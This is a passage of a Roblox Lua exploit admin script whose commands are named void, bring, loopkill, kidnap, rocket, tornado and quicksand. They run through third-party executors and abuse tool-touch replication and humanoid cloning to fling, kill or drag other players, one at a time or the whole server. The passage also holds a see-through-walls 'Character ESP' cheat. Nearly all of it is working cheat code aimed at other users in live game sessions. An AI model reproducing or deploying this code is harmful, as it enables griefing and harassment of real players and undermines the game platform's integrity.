			plr.Character.Animate.Disabled = true
			Humanoid.Parent = plr.Character
			plr.Character.Humanoid:Destroy()
			plr.Character.Humanoid:ChangeState(15)
			Tool.Parent = plr.Character
			firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)
		end
	end
end)

AddCommand('void', {}, 'Void v2 (Supports all executors)', function(Args)
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local firetouchinterest = function(a, b, c)
		local d = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
	end

	workspace.FallenPartsDestroyHeight = -500
	if Args[1] == 'others' or Args[1] == 'all' then
		plr.Character.Humanoid:UnequipTools() RenderStepped:Wait()

		local Index = 0
		local Tools = plr.Backpack:GetChildren()
		local LastPosition = plr.Character:GetModelCFrame()
		spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition end)

		if maxn(Tools) > 2 or Notify('2+ tools required') then
			for _, v in next, filter(GetPlayers(), plr) do
				if v.Character and v.Character:FindFirstChild('Humanoid') and v.Character.Humanoid.Health > 0 and not v.Character.Humanoid.SeatPart then
					Heartbeat:Wait()

					Index = Index + 1
					local Tool = Tools[Index]
					pcall(function()
						spawn(function()
							local Humanoid = plr.Character.Humanoid:Clone()
	
							for _, v in next, plr.Character:GetChildren() do
								if v:IsA('Accessory') or v:IsA('Hat') then
									v:ClearAllChildren()
								end
							end
	
							plr.Character.Animate.Disabled = true
							Humanoid.Parent = plr.Character
							plr.Character.Humanoid:Destroy()
							Tool.Parent = plr.Character
	
							spawn(function()
								for i = 1, 5 do
									v.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
								end
							end)
	
							firetouchinterest(Tool.Handle, v.Character.PrimaryPart, 0)
						end)
					end)
				end
			end
			
			plr.Character.HumanoidRootPart.CFrame = CFrame.new(0, -498.8, 0)
			plr.Character:SetPrimaryPartCFrame(CFrame.new(0, -498.8, 0))
		end
	elseif Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			if Player.Character.Humanoid.Health == 0 then return end
			if plr.Character and plr.Character:FindFirstChild('Humanoid') then
				local LastPosition = plr.Character:GetModelCFrame()
				local Humanoid = plr.Character.Humanoid:Clone()

				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('Accessory') or v:IsA('Hat') then
						v:Remove()
					end
				end

				spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition;workspace.FallenPartsDestroyHeight = 0/0 end)

				plr.Character.Animate.Disabled = true
				Humanoid.Parent = plr.Character
				plr.Character.Humanoid:Destroy()
				Tool.Parent = plr.Character
				plr.Character.HumanoidRootPart.CFrame = CFrame.new(0, -498.8, 0)
				plr.Character:SetPrimaryPartCFrame(CFrame.new(0, -498.8, 0))
				firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)
			end
		end
	end
end)

AddCommand('bring', {}, 'Bring v2 (Supports all executors)', function(Args)
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local Player2 = GetPlayer(Args[2])
	local firetouchinterest = function(a, b, c, d)
		local g, e = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
		a.CFrame = d and g or a.CFrame
	end

	if Args[1] == 'all' or Args[1] == 'others' then
		plr.Character.Humanoid:UnequipTools() RenderStepped:Wait()

		local Index = 0
		local Tools = plr.Backpack:GetChildren()
		local LastPosition = plr.Character:GetModelCFrame()
		spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition end)

		if maxn(Tools) > 2 or Notify('2+ tools required') then
			for _, v in next, filter(GetPlayers(), plr) do
				if v.Character and v.Character:FindFirstChild('Humanoid') and v.Character.Humanoid.Health > 0 and not v.Character.Humanoid.SeatPart then
					Heartbeat:Wait()

					Index = Index + 1
					local Tool = Tools[Index]
					pcall(function()
						spawn(function()
							local Humanoid = plr.Character.Humanoid:Clone()

							for _, v in next, plr.Character:GetChildren() do
								if v:IsA('Accessory') or v:IsA('Hat') then
									v:ClearAllChildren()
								end
							end

							plr.Character.Animate.Disabled = true
							Humanoid.Parent = plr.Character
							plr.Character.Humanoid:Destroy()
							Tool.Parent = plr.Character
							v.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
							firetouchinterest(Tool.Handle, v.Character.PrimaryPart, 0, true)
						end)
					end)
				end
			end
		end

	elseif Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			if Player.Character.Humanoid.Health == 0 then return end
			local LastPosition = plr.Character:GetModelCFrame()
			local Humanoid = plr.Character.Humanoid:Clone()

			for _, v in next, plr.Character:GetChildren() do
                if v:IsA('Accessory') or v:IsA('Hat') then
                    v:Remove()
                end
            end

			spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition end)

			plr.Character.Animate.Disabled = true
			Humanoid.Parent = plr.Character
			plr.Character.Humanoid:Destroy()
			Tool.Parent = plr.Character
			plr.Character:SetPrimaryPartCFrame(Player2 and Player2.Character:GetModelCFrame() or LastPosition)
			firetouchinterest(Tool.Handle, Player.Character.PrimaryPart, 0, true)
			
			wait(wait(Player2 and 0.3 or 0.1))
			for _, v in next, plr.Character:GetChildren() do
				if not v:IsA('Humanoid') and not v:IsA('Tool') then
					v:Destroy()
				end
			end
		end
	end
end)

AddCommand('givetools', {}, 'Give Tools v2 (Supports all executors)', function(Args)
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local firetouchinterest = function(a, b, c, d)
		local g = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
		a.CFrame = d and g or a.CFrame
	end

	if Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			local LastPosition = plr.Character:GetModelCFrame()
			local Humanoid = plr.Character.Humanoid:Clone()

			for _, v in next, plr.Character:GetChildren() do
                if v:IsA('Accessory') or v:IsA('Hat') then
                    v:Remove()
                end
            end

			spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition end)

			plr.Character.Animate.Disabled = true
			Humanoid.Parent = plr.Character
			plr.Character.Humanoid:Destroy()

			for _, v in next, plr.Backpack:GetChildren() do
				v.Parent = plr.Character
				v.Handle:BreakJoints()
			end

			plr.Character:SetPrimaryPartCFrame(Player.Character:GetModelCFrame())
			firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)
			firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)
			
			wait(0.2)
			for _, v in next, plr.Character:GetChildren() do
				if not v:IsA('Humanoid') and not v:IsA('Tool') then
					v:Destroy()
				end
			end
		end
	end
end)

AddCommand('infvoid', {'begone'}, 'Infinite Void v2 (Supports all executors)', function(Args)
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local firetouchinterest = function(a, b, c)
		local d = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
	end

	if Args[1] == 'all' or Args[2] == 'others' then
		plr.Character.Humanoid:UnequipTools() RenderStepped:Wait()

		local Index = 0
		local Tools = plr.Backpack:GetChildren()
		local LastPosition = plr.Character:GetModelCFrame()
		spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition end)

		if maxn(Tools) > 2 or Notify('2+ tools required') then
			for _, v in next, filter(GetPlayers(), plr) do
				if v.Character and v.Character:FindFirstChild('Humanoid') and v.Character.Humanoid.Health > 0 and not v.Character.Humanoid.SeatPart then
					Heartbeat:Wait()

					Index = Index + 1
					local Tool = Tools[Index]
					spawn(function()
						local Humanoid = plr.Character.Humanoid:Clone()

						for _, v in next, plr.Character:GetChildren() do
							if v:IsA('Accessory') or v:IsA('Hat') then
								v:ClearAllChildren()
							end
						end

						plr.Character.Animate.Disabled = true
						Humanoid.Parent = plr.Character
						plr.Character.Humanoid:Destroy()
						Tool.Parent = plr.Character
						v.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
						firetouchinterest(Tool.Handle, v.Character.PrimaryPart, 0, true)
					end)
				end
			end

			plr.Character.HumanoidRootPart.CFrame = CFrame.new(0, 1e8, 0)
			plr.Character:SetPrimaryPartCFrame(CFrame.new(0, 1e8, 0))
		end
	elseif Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			if Player.Character.Humanoid.Health == 0 then return end
			if plr.Character and plr.Character:FindFirstChild('Humanoid') then
				local LastPosition = plr.Character:GetModelCFrame()
				local Humanoid = plr.Character.Humanoid:Clone()

				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('Accessory') or v:IsA('Hat') then
						v:Remove()
					end
				end

				spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition end)

				plr.Character.Animate.Disabled = true
				Humanoid.Parent = plr.Character
				plr.Character.Humanoid:Destroy()
				Tool.Parent = plr.Character
				plr.Character.HumanoidRootPart.CFrame = CFrame.new(0, 1e8, 0)
				plr.Character:SetPrimaryPartCFrame(CFrame.new(0, 1e8, 0))
				firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)
			end
		end
	end
end)

AddCommand('attach', {'kidnap'}, 'Rob human', function(Args)
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local firetouchinterest = function(a, b, c)
		local d = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
	end

	if Args[1] == 'all' or Args[1] == 'others' then
		plr.Character.Humanoid:UnequipTools() RenderStepped:Wait()

		local Index = 0
		local Tools = plr.Backpack:GetChildren()
		local LastPosition = plr.Character:GetModelCFrame()
		spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition end)

		if maxn(Tools) > 2 or Notify('2+ tools required') then
			for _, v in next, filter(GetPlayers(), plr) do
				if v.Character and v.Character:FindFirstChild('Humanoid') and v.Character.Humanoid.Health > 0 and not v.Character.Humanoid.SeatPart then
					Heartbeat:Wait()

					Index = Index + 1
					local Tool = Tools[Index]
					pcall(function()
						spawn(function()
							local Humanoid = plr.Character.Humanoid:Clone()

							for _, v in next, plr.Character:GetChildren() do
								if v:IsA('Accessory') or v:IsA('Hat') then
									v:ClearAllChildren()
								end
							end

							plr.Character.Animate.Disabled = true
							Humanoid.Parent = plr.Character
							plr.Character.Humanoid:Destroy()
							Tool.Parent = plr.Character
							v.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
							firetouchinterest(Tool.Handle, v.Character.HumanoidRootPart, 0)
						end)
					end)
				end
			end
		end
	elseif Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			if Player.Character.Humanoid.Health == 0 then return end
			if plr.Character and plr.Character:FindFirstChild('Humanoid') then
				local LastPosition = plr.Character:GetModelCFrame()
				local Humanoid = plr.Character.Humanoid:Clone()

				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('Accessory') or v:IsA('Hat') then
						v:Remove()
					end
				end

				spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition end)

				plr.Character.Animate.Disabled = true
				Humanoid.Parent = plr.Character
				plr.Character.Humanoid:Destroy()
				Tool.Parent = plr.Character
				firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)
			end
		end
	end
end)

AddCommand('loopkill', {'lkill'}, 'Loop Kill v2 (Supports all executors)', function(Args)
	if _G.loopkill then
		_G.loopkill = false
		wait(1/8)
	end

	_G.loopkill = true
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local firetouchinterest = function(a, b, c)
		local d = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
		a.CFrame = d
	end

	if Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			while _G.loopkill and wait() do
				if not isIndexOf(GetPlayers(), Player) then
					_G.loopkill = false
					return Notify('Target has left the game', pfp(Player.UserId))
				end

				if not Player.Character then
					Notify(format('Waiting for %s\'s Character.', Player.DisplayName), pfp(Player.UserId), 2)
					Player.CharacterAdded:Wait():WaitForChild('Humanoid')
				end

				if not plr.Character then
					plr.CharacterAdded:Wait():WaitForChild('Humanoid')
				end
	
				if Player.Character then
					repeat wait() until Player.Character:FindFirstChild('Humanoid')
					if Player.Character.Humanoid.Health <= 0 then
						wait(1)
					end
				end
	
				if not plr.Character then
					plr.CharacterAdded:Wait():WaitForChild('Humanoid')
				end

				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('Accessory') or v:IsA('Hat') then
						v:Remove()
					end
				end

				local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
				local LastPosition = plr.Character:GetModelCFrame()
				local Humanoid = plr.Character.Humanoid:Clone()

				plr.Character.Animate.Disabled = true
				Humanoid.Parent = plr.Character
				plr.Character.Humanoid:Destroy()
				plr.Character.Humanoid:ChangeState(15)
				Tool.Parent = plr.Character
				firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)
				plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition
			end
		end
	end
end)

AddCommand('loopvoid', {'lvoid'}, 'Loop Void v2 (Supports all executors)', function(Args)
	if _G.loopvoid then
		_G.loopvoid = false
		wait(1/8)
	end

	_G.loopvoid = true
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local firetouchinterest = function(a, b, c)
		local d = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
		a.CFrame = d
	end

	workspace.FallenPartsDestroyHeight = -500
	if Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			while _G.loopvoid and wait() do
				if not isIndexOf(GetPlayers(), Player) then
					_G.loopvoid = false
					workspace.FallenPartsDestroyHeight = 0/0
					return Notify('Target has left the game', pfp(Player.UserId))
				end

				if not Player.Character then
					Notify(format('Waiting for %s\'s Character.', Player.DisplayName), pfp(Player.UserId), 2)
					Player.CharacterAdded:Wait():WaitForChild('Humanoid')
				end

				if not plr.Character then
					plr.CharacterAdded:Wait():WaitForChild('Humanoid')
				end
	
				if Player.Character then
					repeat wait(0) until Player.Character:FindFirstChild('Humanoid')
					repeat wait(0) until Player.Character:FindFirstChild('Humanoid') and Player.Character.Humanoid.Health > 0
				end
	
				if not plr.Character then
					plr.CharacterAdded:Wait():WaitForChild('Humanoid')
				end

				if not plr.Character:FindFirstChild('Humanoid') then
					repeat wait(0) until plr.Character:FindFirstChild('Humanoid')
				end

				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('Accessory') or v:IsA('Hat') then
						v:Remove()
					end
				end

				local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
				local LastPosition = plr.Character:GetModelCFrame()
				local Humanoid = plr.Character.Humanoid:Clone()

				plr.Character.Animate.Disabled = true
				Humanoid.Parent = plr.Character
				plr.Character.Humanoid:Destroy()
				Tool.Parent = plr.Character
				plr.Character.HumanoidRootPart.CFrame = CFrame.new(0, -498.8, 0)
				plr.Character:SetPrimaryPartCFrame(CFrame.new(0, -498.8, 0))
				firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)
				plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition
			end
		end
	end
end)

AddCommand('unloopkill', {'unlkill'}, 'Disabled Loop Kill v2', function()
	_G.loopkill = false
	Notify('Loop Kill has been Disabled!')
end)

AddCommand('unloopvoid', {'unlvoid'}, 'Disabled Loop Void v2', function()
	_G.loopvoid = false
	Notify('Loop Void has been Disabled!')
end)

AddCommand('rocket', {'skydive'}, 'NASA Moment', function(Args)
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local firetouchinterest = function(a, b, c)
		local d = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
	end

	if Args[1] == 'all' or Args[1] == 'others' then
		plr.Character.Humanoid:UnequipTools() RenderStepped:Wait()

		local Index = 0
		local Tools = plr.Backpack:GetChildren()
		local LastPosition = plr.Character:GetModelCFrame()
		spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition; StopR = true end)

		if maxn(Tools) > 2 or Notify('2+ tools required') then
			local StopR = false
			for _, v in next, filter(GetPlayers(), plr) do
				if v.Character and v.Character:FindFirstChild('Humanoid') and v.Character.Humanoid.Health > 0 and not v.Character.Humanoid.SeatPart then
					Heartbeat:Wait()

					Index = Index + 1
					local Tool = Tools[Index]
					pcall(function()
						spawn(function()
							local Humanoid = plr.Character.Humanoid:Clone()

							for _, v in next, plr.Character:GetChildren() do
								if v:IsA('Accessory') or v:IsA('Hat') then
									v:ClearAllChildren()
								end
							end

							plr.Character.Animate.Disabled = true
							Humanoid.Parent = plr.Character
							plr.Character.Humanoid:Destroy()
							Tool.Parent = plr.Character
							v.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
							firetouchinterest(Tool.Handle, v.Character.PrimaryPart, 0, true)
						end)
					end)
				end
			end

			repeat plr.Character:SetPrimaryPartCFrame(plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 50, 0)); Heartbeat:Wait() until StopR
		end
	elseif Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			if Player.Character.Humanoid.Health == 0 then return end
			if plr.Character and plr.Character:FindFirstChild('Humanoid') then
				local LastPosition = plr.Character:GetModelCFrame()
				local Humanoid = plr.Character.Humanoid:Clone()
				local StopR = false

				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('Accessory') or v:IsA('Hat') then
						v:Remove()
					end
				end

				spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition; StopR = true end)

				plr.Character.Animate.Disabled = true
				Humanoid.Parent = plr.Character
				plr.Character.Humanoid:Destroy()
				Tool.Parent = plr.Character
				firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)

				repeat plr.Character:SetPrimaryPartCFrame(plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 50, 0)); Heartbeat:Wait() until StopR
			end
		end
	end
end)

AddCommand('tornado', {}, 'Florida Moment', function(Args)
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local firetouchinterest = function(a, b, c)
		local d = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
	end

	if Args[1] == 'all' or Args[1] == 'others' then
		plr.Character.Humanoid:UnequipTools() RenderStepped:Wait()

		local Index = 0
		local Tools = plr.Backpack:GetChildren()
		local LastPosition = plr.Character:GetModelCFrame()
		spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition; StopR = true end)

		if maxn(Tools) > 2 or Notify('2+ tools required') then
			local StopR = false
			for _, v in next, filter(GetPlayers(), plr) do
				if v.Character and v.Character:FindFirstChild('Humanoid') and v.Character.Humanoid.Health > 0 and not v.Character.Humanoid.SeatPart then
					Heartbeat:Wait()

					Index = Index + 1
					local Tool = Tools[Index]
					pcall(function()
						spawn(function()
							local Humanoid = plr.Character.Humanoid:Clone()

							for _, v in next, plr.Character:GetChildren() do
								if v:IsA('Accessory') or v:IsA('Hat') then
									v:ClearAllChildren()
								end
							end

							plr.Character.Animate.Disabled = true
							Humanoid.Parent = plr.Character
							plr.Character.Humanoid:Destroy()
							Tool.Parent = plr.Character
							v.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
							firetouchinterest(Tool.Handle, v.Character.PrimaryPart, 0, true)
						end)
					end)
				end
			end

			repeat plr.Character.HumanoidRootPart.RotVelocity = Vector3.new(0, 500, 0); plr.Character:SetPrimaryPartCFrame(plr.Character.HumanoidRootPart.CFrame * CFrame.new(random(-5, 5), random(-5, 5), random(-5, 5))); Heartbeat:Wait() until StopR
		end
	elseif Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			if Player.Character.Humanoid.Health == 0 then return end
			if plr.Character and plr.Character:FindFirstChild('Humanoid') then
				local LastPosition = plr.Character:GetModelCFrame()
				local Humanoid = plr.Character.Humanoid:Clone()
				local StopR = false

				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('Accessory') or v:IsA('Hat') then
						v:Remove()
					end
				end

				spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition; StopR = true end)

				plr.Character.Animate.Disabled = true
				Humanoid.Parent = plr.Character
				plr.Character.Humanoid:Destroy()
				Tool.Parent = plr.Character
				firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)

				repeat plr.Character.HumanoidRootPart.RotVelocity = Vector3.new(0, 500, 0); plr.Character:SetPrimaryPartCFrame(plr.Character.HumanoidRootPart.CFrame * CFrame.new(random(-5, 5), random(-5, 5), random(-5, 5))); Heartbeat:Wait() until StopR
			end
		end
	end
end)

AddCommand('quicksand', {'qs'}, 'Pull player to the pits of hell, MWAHAHHA', function(Args)
	local Tool = plr.Backpack:FindFirstChildWhichIsA('Tool') or plr.Character:FindFirstChildWhichIsA('Tool')
	local Tool = Tool and Tool.RequiresHandle and Tool
	local Player = GetPlayer(Args[1])
	local firetouchinterest = function(a, b, c)
		local d = a.CFrame
		if firetouchinterest then firetouchinterest(b, a, 0) end
		b.CFrame = a.CFrame
		a.Touched:Wait()
	end

	if Args[1] == 'all' or Args[1] == 'others' then
		plr.Character.Humanoid:UnequipTools() RenderStepped:Wait()

		local Index = 0
		local Tools = plr.Backpack:GetChildren()
		local LastPosition = plr.Character:GetModelCFrame()
		spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition; StopR = true end)

		if maxn(Tools) > 2 or Notify('2+ tools required') then
			local StopR = false
			for _, v in next, filter(GetPlayers(), plr) do
				if v.Character and v.Character:FindFirstChild('Humanoid') and v.Character.Humanoid.Health > 0 and not v.Character.Humanoid.SeatPart then
					Heartbeat:Wait()

					Index = Index + 1
					local Tool = Tools[Index]
					pcall(function()
						spawn(function()
							local Humanoid = plr.Character.Humanoid:Clone()

							for _, v in next, plr.Character:GetChildren() do
								if v:IsA('Accessory') or v:IsA('Hat') then
									v:ClearAllChildren()
								end
							end

							plr.Character.Animate.Disabled = true
							Humanoid.Parent = plr.Character
							plr.Character.Humanoid:Destroy()
							Tool.Parent = plr.Character
							v.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
							firetouchinterest(Tool.Handle, v.Character.PrimaryPart, 0, true)
						end)
					end)
				end
			end

			for _, v in next, plr.Character:GetChildren() do
				if v:IsA('BasePart') and find({'LeftUpperArm', 'Left Arm', 'LeftUpperLeg', 'RightUpperLeg', 'Right Leg', 'Left Leg'}, v.Name) then
					v:Destroy()
				end
			end

			repeat plr.Character:SetPrimaryPartCFrame(Start * CFrame.new(0, -0.1, 0)); Start = plr.Character.HumanoidRootPart.CFrame; Heartbeat:Wait() until StopR
		end
	elseif Player or Notify(format('Could not find player %s', Args[1])) then
		if Tool or Notify('Tool required!') then
			if Player.Character.Humanoid.Health == 0 then return end
			if plr.Character and plr.Character:FindFirstChild('Humanoid') then
				local LastPosition = plr.Character:GetModelCFrame()
				local Humanoid = plr.Character.Humanoid:Clone()
				local Start = plr.Character.HumanoidRootPart.CFrame
				local StopR = false

				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('Accessory') or v:IsA('Hat') then
						v:Remove()
					end
				end

				spawn(function() plr.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = LastPosition; StopR = true end)

				plr.Character.Animate.Disabled = true
				Humanoid.Parent = plr.Character
				plr.Character.Humanoid:Destroy()
				Tool.Parent = plr.Character
				firetouchinterest(Tool.Handle, Player.Character.HumanoidRootPart, 0)
				for _, v in next, plr.Character:GetChildren() do
					if v:IsA('BasePart') and find({'LeftUpperArm', 'Left Arm', 'LeftUpperLeg', 'RightUpperLeg', 'Right Leg', 'Left Leg'}, v.Name) then
						v:Destroy()
					end
				end

				repeat plr.Character:SetPrimaryPartCFrame(Start * CFrame.new(0, -0.1, 0)); Start = plr.Character.HumanoidRootPart.CFrame; Heartbeat:Wait() until StopR
			end
		end
	end
end)

AddCommand('hideplayers', {}, 'Hides all players', function()
	_G.HidePlayers = _G.HidePlayers or Instance.new('Folder', Lighting)

	local Folder = _G.HidePlayers
	Folder.Name = 'Hidden Players'
	Folder.Parent = Lighting

	for _, v in next, filter(GetPlayers(), plr) do
		if v.Character then
			v.Character.Parent = Folder
		end
	end

	Disconnect(GSignals['HidePlayers'])
	GSignals['HidePlayers'] = workspace.ChildAdded:Connect(function(Obj)
		if Obj:IsA('Model') and isIndexType(GetPlayers(), Obj) then
			Obj:WaitForChild('Humanoid', 5)

			if Obj:FindFirstChild('Humanoid') then
				Obj.Parent = Folder
			end
		end
	end)
end)

AddCommand('unhideplayers', {'showplayers'}, 'Unhides all players', function()
	if _G.HidePlayers then
		for _, v in next, _G.HidePlayers:GetChildren() do
			v.Parent = workspace
		end
	end
end)

AddCommand('autodeltools', {'adt'}, 'Auto Delets any Tools Given', function()
	Signals['AutoDeleteTools'] = Stepped:Connect(function()
		if plr.Character then
			if plr.Character:FindFirstChildWhichIsA('Tool') then
				plr.Character:FindFirstChildWhichIsA('Tool'):ClearAllChildren(); RenderStepped:Wait();
				plr.Character:FindFirstChildWhichIsA('Tool').Grip = CFrame.new();
			end
		end
	end)
end)

AddCommand('characteresp', {'cesp', 'esp2'}, 'Character ESP', function()
    Notify('Character ESP Loaded!');

    -- // Code
    local Highlights = {};
    local RayParams = RaycastParams.new();
    local isOnScreen = function(Player)
        if Player and Player:IsA('Player') and Player.Character and Player.Character:FindFirstChild('Humanoid') and Player.Character.Humanoid.Health > 0 then
            local _, Os = workspace.CurrentCamera:WorldToScreenPoint(Player.Character:GetModelCFrame().Position);
            return Os;
        end

        return nil;
    end

    local isBlocked = function(Player)
        local Blacklisted = {};
        for _, v in next, filter(GetPlayers(), plr) do
            if v.Character then
                for _, v2 in next, v.Character:GetDescendants() do
                    if v2:IsA('BasePart') then
                        insert(Blacklisted, v2);
                    end
                end
            end
        end

        RayParams.FilterDescendantsInstances = Blacklisted;
        RayParams.FilterType = Enum.RaycastFilterType.Blacklist;
        
        if Player and Player:IsA('Player') and Player.Character and Player.Character:FindFirstChild('Humanoid') and Player.Character.Humanoid.Health > 0 then
            return workspace:Raycast(workspace.CurrentCamera.CFrame.Position, (Player.Character:GetModelCFrame().Position - workspace.CurrentCamera.CFrame.Position), RayParams);
        end

        return nil;
    end

    local Highlight = function()
        for _, v in next, Highlights do
            v:Destroy();
        end

        for _, v in next, filter(GetPlayers(), plr) do
            if isOnScreen(v) and isBlocked(v) then
                local Highlight = Instance.new('Highlight', v.Character);
                Highlight.DepthMode = 0;
                Highlight.Adornee = Part;
                Highlight.FillTransparency = 0.8;

                insert(Highlights, Highlight);
            end
        end
    end

    plrs.PlayerAdded:Connect(Highlight);
    plrs.PlayerRemoving:Connect(Highlight);

    while wait() do
        Highlight()
    end
end)

AddCommand('hidetag', {'notag', 'distag'}, 'Hides Overhead Tag', function(Args)
	Disconnect(GSignals['Overhead'])
	GSignals['Overhead'] = plr.CharacterAdded:Connect(function(Chr)
		repeat wait(0) until Chr:FindFirstChild('Head')
		wait(1);
		Chr.Head['Client Bridge v3'].Enabled = false
	end)

	if plr.Character and plr.Character:FindFirstChild('Head') and plr.Character.Head:FindFirstChild('Client Bridge v3') then
		plr.Character.Head['Client Bridge v3'].Enabled = false
	end
end)

AddCommand('showtag', {'enabletag'}, 'Shows Overhead Tag', function()
	Disconnect(GSignals['Overhead'])
	if plr.Character and plr.Character:FindFirstChild('Head') and plr.Character.Head:FindFirstChild('Client Bridge v3') then
		plr.Character.Head['Client Bridge v3'].Enabled = true
	end
end)

AddCommand('ivchat', {}, 'Iv Chat Communicate with other Users', function(Args)
	if true then
		return Notify('This command no longer works.', 4)
	end

	if Core:FindFirstChild('Iv-Chat') then
		Core['Iv-Chat']:Destroy();
	end

	local RBX = {};
	local IvChat = GetObjs(11937795316);
